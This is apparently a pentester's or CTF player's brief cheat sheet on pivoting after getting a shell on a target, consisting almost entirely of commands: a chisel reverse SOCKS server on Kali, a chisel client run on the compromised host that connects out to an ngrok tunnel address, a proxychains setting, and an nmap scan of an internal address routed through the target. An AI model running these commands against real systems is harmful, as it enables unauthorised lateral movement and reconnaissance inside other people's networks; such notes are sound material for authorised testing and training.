After you have shell on target and want to pivot further:

kali:
./chisel32 server -p 8081 --reverse

on target:
./chisel32 client 6.tcp.eu.ngrok.io:12529 R:socks

proxychains config:
socks5 127.0.0.1 1080

Proxy through target:
proxychains -q nmap -sT -Pn -F 10.1.1.71 -v 
![unnamed_35fb3ad563d1430ebc24740268c56c42](unnamed_35fb3ad563d1430ebc24740268c56c42.png)
![unnamed_e5f0e21c79c5455da4a5174f7475dfdb](unnamed_e5f0e21c79c5455da4a5174f7475dfdb.png)
